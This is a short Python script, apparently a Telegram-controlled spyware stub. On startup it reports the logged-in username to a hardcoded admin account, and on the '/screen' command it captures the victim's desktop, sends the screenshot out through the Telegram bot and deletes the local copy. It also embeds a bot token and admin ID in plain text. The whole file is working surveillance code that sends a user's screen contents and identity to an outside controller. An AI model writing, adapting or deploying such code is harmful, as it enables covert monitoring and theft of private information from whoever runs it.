import os
import asyncio
import pyautogui
from aiogram import Bot, Dispatcher, types

TOKEN = '8438376075:AAFlsQvzOLvpLf72_NIu38_V7YzdFqe9n68'
ADMIN_ID = 6445545778

bot = Bot(token=TOKEN)
dp = Dispatcher()

@dp.message()
async def handle_commands(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    if message.text == "/screen":
        pyautogui.screenshot("s.png")
        await message.answer_photo(types.FSInputFile("s.png"), caption="Скриншот готов!")
        os.remove("s.png")
    
    elif message.text == "/info":
        await message.answer(f"Бот онлайн. Юзер: {os.getlogin()}")

async def on_startup():
    try:
        await bot.send_message(ADMIN_ID, f"🚀 Система запущена! Юзер: {os.getlogin()}")
    except:
        pass

async def main():
    await on_startup()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
